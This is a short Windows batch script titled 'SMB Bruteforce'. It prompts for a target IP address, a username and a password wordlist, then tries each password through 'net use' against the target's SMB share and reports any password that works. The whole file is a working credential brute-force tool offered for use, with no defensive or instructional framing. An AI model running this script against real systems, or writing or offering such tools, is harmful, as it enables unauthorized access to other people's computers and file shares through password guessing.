@echo off
setlocal enabledelayedexpansion
title SMB Bruteforce - by Ebola Man
rem Optimized by makers-mark briefly https://github.com/makers-mark/SMB-Bruteforce
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
(for /f %%a in (%wordlist%) do (
  net use \\%ip% /user:%user% %%a && call :success %%a
  echo [ATTEMPT !count!] [%%a]
  set /a count=!count!+1
)) 2>nul

echo Password not Found :(
pause
exit

:success
echo.
echo Password Found! %~1
net use \\%ip% /d /y >nul 2>&1
pause
exit
